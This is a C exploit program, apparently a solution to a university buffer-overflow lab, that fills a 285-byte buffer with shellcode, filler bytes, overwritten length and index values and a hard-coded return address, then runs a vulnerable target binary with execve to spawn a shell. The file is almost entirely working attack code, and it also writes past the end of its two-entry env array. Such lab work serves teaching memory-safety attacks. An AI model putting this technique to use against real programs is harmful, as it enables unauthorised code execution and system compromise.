#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"
#define hacking_memory "\x40\xfd\x21\x20\x00" // memory of buffer in foo()
#define shell_size 45 // not 46
#define buffer_len 285 //foo return address - buffer address + 4 (for rp) + 1 (null character)
#define new_len "\x1C\x01\x00\x00\x00"// length = 284
#define new_i "\x0B\x01\x03\x02\x00"

// buffer len 285 is greater than 272 indicated by the len also need to cheange the value of len

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char hack_buffer[buffer_len];

	int i; // inputting shellcode in first 46 bytes
	for (i=0; i< shell_size; i++){
		hack_buffer[i] = shellcode[i];
	}

	for (i=45; i< buffer_len; i++){ // inputting junk for the rest of the buffer that is not null
		hack_buffer[i] = 0x03; 
	}

	

	memcpy(&hack_buffer[280], hacking_memory, 4);

	memcpy(&hack_buffer[268], new_len, 4);

	memcpy(&hack_buffer[264], new_i, 4);


	hack_buffer[buffer_len - 1] = '\0'; //null character

	args[0] = TARGET;
	args[1] = hack_buffer;
	args[2] = NULL;

	env[0] = &hack_buffer[271]; // because of the new length string having 0s at hack_buffer[270]
	env[1] = &hack_buffer[272];

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
